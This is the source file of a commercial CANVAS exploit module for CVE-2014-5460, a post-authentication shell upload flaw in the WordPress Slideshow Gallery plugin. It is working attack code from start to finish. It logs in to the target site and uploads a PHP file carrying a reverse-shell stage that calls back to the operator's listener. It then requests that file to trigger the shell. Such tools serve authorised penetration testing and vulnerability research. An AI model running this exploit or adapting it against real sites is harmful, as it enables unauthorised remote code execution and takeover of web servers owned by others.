#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2014
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import os
import socket
import time
import re
import urllib2
import cookielib
import urllib
import string
import random

if "." not in sys.path:
    sys.path.append(".")

import timeoutsocket
import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *

from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
from contextlib import contextmanager
from phplistener import get_php_stage1

NAME                            = "CVE-2014-5460"
DESCRIPTION                     = "Shell upload in Tribulant's Slideshow Gallery"
VERSION                         = "1.0"

DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Tribulant"
DOCUMENTATION["Date public"]    = "08/31/14"
DOCUMENTATION["CERT Advisory"]  = "None"
DOCUMENTATION["Repeatability"]  = "Infinite"
DOCUMENTATION["References"]     = "http://packetstormsecurity.com/files/128069/WordPress-Slideshow-Gallery-1.4.6-Shell-Upload.html"
DOCUMENTATION["CVE Name"]       = "CVE-2014-5460"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-5460"
DOCUMENTATION["Changelog"]      = "https://wordpress.org/plugins/slideshow-gallery/changelog/"
DOCUMENTATION["Notes"]          = """

If the Suhosin-Patch is installed (typically announced in the PHP banner) the MOSDEF PHP
shell startup will not work however the vulnerability will still be exploitable.

This is a post authentication shell upload vulnerability in a popular (400k+ downloads)
wordpress plugin. By default only admins can reach the vulnerability.

The plugin does allow for administrators to give any class of user the ability to
interact with the vulnerable functionality, though they would have to do so deliberately.
"""

PROPERTY            = {}
PROPERTY["TYPE"]    = "Web Exploits"
PROPERTY["SITE"]    =  "Remote"
PROPERTY["ARCH"]    = [["Linux"]]
PROPERTY["VERSION"] = []

targets = {}


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name       = NAME
        self.debug      = False
        self.ssl        = None
        self.url        = None
        self.username   = None # This is Post-Auth
        self.password   = None
        self.hostname   = None # In the case of vhosts
        self.charSet    = string.lowercase + string.digits
        self.slideTitle = ''.join(random.sample(self.charSet*8, 8))
        self.shellFile  = ''.join(random.sample(self.charSet*8, 8))

    def getargs(self):
        self.getarg("ssl")
        if self.ssl != "True" or self.ssl != "true":
            self.ssl = False

        self.getarg("url")
        if "/index.php" in self.url:
            self.url.replace("/index.php", "/")
        if self.url[-1] != "/":
             self.url = self.url + "/"

        self.getarg("username")
        self.getarg("password")
        self.getarg("hostname")

        self.node = self.argsDict["passednodes"][0]

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def usage(self):
        """
        We need a bit more information than just the target's IP
        """
        print "=" * 10
        print "Post-auth shell upload vulnerability in the slideshow-gallery plugin for Wordpress"
        print "-O url:<path to wordpress>" # ex: wordpress/
        print "-O ssl:<True/False>"
        print "-O username:<username> # User must be provisioned to add new slides to the gallery"
        print "-O password:<password>"
        print "-O hostname:<hostname> # If no DNS record is present for the host, use the IP"
        print "=" * 10

    def testUrl(self):
        """
        Let's make sure the supplied host is reachable and looks like a wordpress page
        """
        # Make the request
        try:
            if self.ssl:
                testUrl = "https://" + self.hostname + self.url + "wp-login.php"
            else:
                testUrl = "http://" + self.hostname + self.url + "wp-login.php"
            self.log("[+] Checking that %s is the WordPress login page" % testUrl)
            (testResponse, testCode) = spkproxy.urlopen(testUrl,
                                       verb = "GET",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
            resData = testResponse.read()
        except IOError as e:
            self.log("[EE] Failed to connect to provided URL (%s)" % testUrl)
            self.log(e.strerror)

        # Test the results
        if testCode == -1:
            self.log("[EE] Unable to contact the server at %s" % testUrl)
        elif testCode != 200:
            self.log("[ii] Received an HTTP STATUS CODE of %d" % testCode)
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testCode)
        elif re.search("Lost your password", resData, re.IGNORECASE):
            self.log("[ii] Found the WordPress login page, proceeding")
            self.url = testUrl.replace("wp-login.php", "")
            return True
        else:
            self.log("[EE] Didn't find the expected WordPress login page, aborting")
            self.log("[ii] Visit %s and ensure it is the WordPress login page" % testUrl)

        return False

    def parseCookies(self, res, exheaders):
        """
        We have to handle cookies ourselves with spkproxy
        """
        cookie = ""
        for line in res.read().splitlines():
            if "Set-Cookie" in line:
                temp = line.split(" ")[1]
                cookie += temp + " "
        exheaders.append(("Cookie", cookie))
        return exheaders

    def logInToWordpress(self):
        """
        This is post-auth so we'll need to log in
        """
        exheaders = [("Content-Type", "application/x-www-form-urlencoded"), ("Connection", "keep-alive")]
        authString = "log=" + self.username + "&pwd=" + self.password + "&wp-submit=Log+in"
        (res, code) = spkproxy.urlopen(self.url + "wp-login.php",
                                       extraheaders = exheaders,
                                       data = authString,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = True,
                                       return_response_code = True)
        if code == 302:
            exheaders = self.parseCookies(res, exheaders)
            return exheaders
        else:
            self.log("[EE] Login failed")
            return False

    def uploadShell(self, exheaders):
        """
        Upload a shell through our authenticated session
        """
        # Generate the PHP callback
        host        = self.callback.ip
        port        = self.callback.port
        badChars    = ""

        # This is the code that'll be inserted on the remote machine, if you want a custom shell do it here
        ret = "<?php " + get_php_stage1(badChars, host, port) + " ?>"

        # Create our payload to POST
        payload = ""
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[id]\"\r\n"
        payload += "\r\n\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[order]\"\r\n"
        payload += "\r\n\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[title]\"\r\n"
        payload += "\r\n%s\r\n" % self.slideTitle
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[description]\"\r\n"
        payload += "\r\nDefault slide\r\n" # This value appears to be overridden by the Slide[title] value
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[showinfo]\"\r\n"
        payload += "\r\nboth\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[iopacity]\"\r\n"
        payload += "\r\n70\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[type]\"\r\n"
        payload += "\r\nfile\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"image_file\"; filename=\"%s.php\"\r\n" % self.shellFile
        payload += "Content-Type: application/octet-stream\r\n\r\n"
        payload += "%s\r\n" % ret
        payload += "--576a5sdf6--\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[image_url]\"\r\n"
        payload += "\r\n\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[uselink]\"\r\n"
        payload += "\r\nN\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[link]\"\r\n"
        payload += "\r\n\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"Slide[linktarget]\"\r\n"
        payload += "\r\nself\r\n"
        payload += "--576a5sdf6\r\n"
        payload += "Content-Disposition: form-data; name=\"submit\"\r\n"
        payload += "\r\nSave Slide\r\n"
        payload += "--576a5sdf6\r\n"

        # Update connection parameters
        url = self.url + "wp-admin/admin.php?page=slideshow-slides&method=save"
        exheaders.remove(("Content-Type", "application/x-www-form-urlencoded"))
        exheaders.append(("Content-Type", "multipart/form-data; boundary=576a5sdf6"))

        # Make the POST
        (res, code) = spkproxy.urlopen(url,
                                       extraheaders = exheaders,
                                       data = payload,
                                       verb = "POST",
                                       hostname = self.hostname,
                                       exploit = self,
                                       entireresponse = False,
                                       return_response_code = True)
        # Check for failure
        text = res.read()
        if re.search("sufficient permissions", text):
            self.log("[EE] The account provided did not have the required permissions to exploit this vulnerability")
            return False

        return True

    def trigger(self):
        """
        Visit our callback
        """
        url = self.url + "wp-content/uploads/slideshow-gallery/%s.php" % self.shellFile
        self.log("[+] Trying to visit %s" % url)
        (trigResp, trigCode) = spkproxy.urlopen(url, verb = "GET", hostname = self.hostname, entireresponse = True, return_response_code = True)
        if trigCode != 200:
           self.log("[ii] Received HTTP STATUS CODE of %d" % trigCode)
           self.log("[EE] Upload failed for an unknown reason")
        else:
           self.log("[ii] Upload succeeded")
           return True

        return False

    def run(self):
        self.getargs()
        print self.host
        if self.testUrl():
            exheaders = self.logInToWordpress()
            if exheaders:
                if self.uploadShell(exheaders):
                    self.trigger()
                else:
                    return False
            else:
                return False

        return True


if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
